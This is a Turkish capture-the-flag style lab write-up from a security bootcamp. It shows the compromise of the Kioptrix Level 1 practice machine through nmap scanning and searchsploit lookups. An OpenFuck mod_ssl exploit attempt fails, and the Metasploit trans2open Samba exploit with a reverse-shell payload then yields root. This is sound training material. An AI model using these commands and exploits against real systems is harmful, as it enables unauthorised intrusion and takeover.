Gorev: KIOPTRIX MAKİNESİNİ İNDİRİNİZ VE  1 ADET ZAFİYET BULUP EXPLOİT EDİNİZ.
1. Kioptrix

	-Oncelikle Kioptrix level1 makinemi calistirdim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231113170625.png)

	-makineye erismek icin bizden kullanici adi ve sifre istemekte. temel amacimiz bu makineye root olarak erismek. bu sebeple nasil erisecegimizi dusunmeliyiz. brute force ile k.adi - sifre kombinasyonlarini 		deneyebiliriz.

	-yapabileceklerimizden biri bu makinenin ip adresini ogrenmek olmalidir. daha sonra bir zafiyet var ise bu zafiyetten yararlanip sisteme giris yapmaya calismaliyiz.

2. Kali
   
	-agimizda cihazlari ve ip adreslerini ogrenmek icin bir kesif baslatmaliyiz. bunun icin nmap aracini kullanabiliriz. ben islemlerime kali linux uzerinden devam edecegim. bunun sebebi icerisinde sizma testi 		araclarini barindirmasi.

3. Nmap Discovery
   
	-Agimizdaki cihazin ip sini ogrenmek istiyoruz. bildigimiz gibi nmap cok kapsamli ve cok fazla parametresi olan bir tool. bizim isimize yarayacak parametreleri bulmamiz gerekiyor. "nmap -help" yazarak 		parametrelere bakabiliriz.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231113170910.png)

	 -nmap -sn "ip" parametreleri ile agimizda bulunan cihazlari goruntuleyebiliriz.
   
	Bu baglamda bir tarama yapacagimiz icin ip blogumuzu ogrenmemiz gerekli. "ifconfig" komutu ile internet arayuzlerini goruntuleyebiliriz.
	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231113204730.png)

	-burada internete bagli interfaceimizin eth0 oldugunu, ip adresimizin 192.168.5.128 oldugunu goruyoruz. tarama yapacagimiz blok 192.168.5.0/24
	nmap'in blogu taramasini istiyoruz.

	nmap -sn 192.168.5.0/24

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231113205634.png)

	burada ag uzerindeki cihazlari gorebilmekteyiz. hedef cihazimizin ip adresi 192.168.5.129

	Tarama sonuclarindan "192.168.5.129" Kioptrix makinemizin ip adresidir.

	-Elimizdeki ip adresiyle ne yapabiliriz? acik portlari bulup bu portlarla ne yapabiliriz diye ustunde kafa yorabiliriz. bunun icin yine nmap araci isimizi gorecektir.

6. Nmap Port-Service Discovery
	
 	acik portlari ve servisleri bulmak  nmapi bu parametre ile kullanabiliriz.
	"nmap -T4 -sT -sV 192.168.5.129 -oX kioptrix.xml"
	-T4: zamanlama icin kullanilan parametre
	-sT: tcp handshake i icin kullanilan parametre
	-sV: portlarda calisan servisleri ve versiyonlari bulmaya yarar.
	-oX: sonrasinda bulunan ciktilari dosyaya yazdirmak icin kullanilan parametre.

	acik portlar servisler ve surumleri bu sekilde.
	22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
	80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
	111/tcp  open  rpcbind     2 (RPC #100000)	
	139/tcp  open  netbios-ssn Samba smbd (workgroup: FLMYGROUP)
	443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
	1024/tcp open  status      1 (RPC #100024)

	Sirasiyla bu surumlerde isimize yarayabilecek aciklari taramaya baslayalim. 
	Arayacagimiz aciklar:

	#OpenSSH 2.9p2 (protocol 1.99)
	#Apache 1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
	httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
	#RPC #100000, #100024
	#Samba 
	Bu servisler ile ilgili zafiyetleri bulmak icin searchsploit aracini kullanabiliriz.

5. Searchsploit, Metasploit ve Zafiyetleri Somurme
   
	-oncelikle nasil kullanabilecegimize bakalim.

	"searchsploit -h"

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231113234626.png)

	nmap sonucu elde ettigimiz xml dosyasini buraya input olarak verip, servislerin zafiyetlerini bulabiliriz. bunun icin asagidaki parametreyi kullanmaliyiz.
	
	"searchsploit --nmap kioptrix.xml"

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114001454.png)

	fakat bu durumda bazen cok fazla secenek cikabilmekte. bu yuzden buldugumuz servisleri spesifik olarak verip nokta atisi bulmaya calisabiliriz.
	oncelikle #OpenSSH ile baslayalim.
	
	#OpenSSH 
	searchsploit  openssh 2.9p2

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114002648.png)

	baktigimizda isimize yarayacak kritik acikli bir zafiyet yok gibi gorunuyor. zaten ana hedefimiz root erisimi elde etmek.

	#Apache httpd 1.3.20

	searchsploit apache 1.3.20

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114024810.png)

	Burada bizim de acik portumuzun surumu olan Apache OpenSSL mod_ssl 2.8.4 u kapsayan 'OpenFuckV2.c' Remote Buffer Overflow (2) exploitini gormekteyiz. v2 yi secme sebebim daha guncel olmasi ve zafiyeti 		daha saglam somurebilecegimi dusunmem.

	Bu exploiti internettte arattim ve exploit-db.com uzerinden nasil kullanacagima baktim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114025206.png)

	gereklilikleri yukleyip derlemesini yapmamiz istenmis.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114025344.png)

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114032501.png)

	exploiti derleyip calistirdik.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114032644.png)
	
	bizim surumumuz:

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114040310.png)

	kullanimi ise su sekilde.

	./OpenFuck 0x6b 192.168.5.129 443 -c 50
   
	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114151301.png)

	burada bir hata ile karsilasmaktayiz. kioptrix makinesi aga dahil fakat internete bagli olmadigindan ssl baglantisi yapilamamakta. ayrica ptrace-kmod.c dosyasinin bulundugu url calismamakta. bu sebeple 		bash e baglanabiliyoruz fakat shell e erisip yetki yukseltme yapamiyoruz. bu sebeple hata aldigim dosyayi indirdim ve local olarak yayin yaptim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114151332.png)
		
	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114150859.png)

	ardindan openfuck.c dosyasi icindeki urlyi http yayini yaptigim url ile degistirdim.
	http://192.168.5.128:8000/Downloads/ptrace-kmod.c

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114153946.png)

	sonra dosyayi tekrar derledim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114153306.png)

	fakat sansim yaver gitmedi.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114204924.png)

	makineye erisebiliyordum fakat root yetkisi elde edemedim. bu sebeple diger portlara gecme karari aldim.

	#RPC 100000 ve 100024

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114205158.png)

	bir sonuc elde edemedim. diger porta gecelim.

	#Samba 2.2.1a

	nmap araci ile tam versiyonu goremedik. bu sebeple enum4linux araci ile versiyonu ogrenebiliriz.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114205642.png)

	ip adresini vererek kullanabiliriz.

	enum4linux 192.168.5.129

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114205907.png)

	malesef versiyonu bulamadik. baska bir yol bulalim.

	internette arastirdigim kadari ile metasploit framework uzerinde auxiliary/scanner/smb/smb_version adli bir exploit mevut. buna ip adresimizi vererek smb versiyonunu ogrenebiliriz.

	oncelikle metasploiti acalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114210647.png)

	sonra exploitimize gidelim. ve kullanimina bakalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114210800.png)

	buraya ip adresimizi tek olarak girmeliyiz. bunun icin

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114210855.png)

	payloadimizi boyle hazirladik. exploit diyerek islemi baslatalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114210935.png)

	ve makinemizin samba versiyonunun 2.2.1a oldugunu gorduk. simdi bunun icin bir exploit arayabiliriz.

	searchsploit samba 2.2.1a

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114211658.png)

	metasploit uzerinde #trans2open overflow exploiti oldugunu goruyoruz. tekrar metasploiti acalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114211922.png)

	sonrasinda search trans2open diyerek exploiti arayalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114212019.png)

	makinemiz redhat yani linux bir makine oldugundan 1 numarayi sececegiz. use 1 diyoruz.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114212109.png)

	options diyerek exploiti nasil kullanacagimiza bakalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114212448.png)

	bize halihazirda bir payload vermis. burada tek eksik olan hedef makinemizin ip adresi.

	set RHOSTS 192.168.5.129 komutu ile hedef makinemizin ip adresini veriyoruz.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114224607.png)

	exploit diyerek payloadi yollayalim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114225936.png)

	sonuc olarak bir loopa girdik ve meterpreter deploy olmadi. baska bir payloada bakalim.

	show payloads diyelim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114230239.png)

	onceki kullandigimiz payload 17 idi. benzer olan 29 numarayi alalim.

	set payload linux/x86/shell_reverse_tcp diyerek payloadi aktif edelim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114225335.png)

	exploit diyelim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114230638.png)

	ve shell e ulastik. komutlari gondererek test edelim.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114230731.png)

	ve root olarak erisim saglamis bulunmaktayiz.

	![](https://github.com/metalfury/Techcareer-Cyber-Security-Bootcamp/blob/main/kioptrix_level1/src/Pasted_image_20231114231846.png)
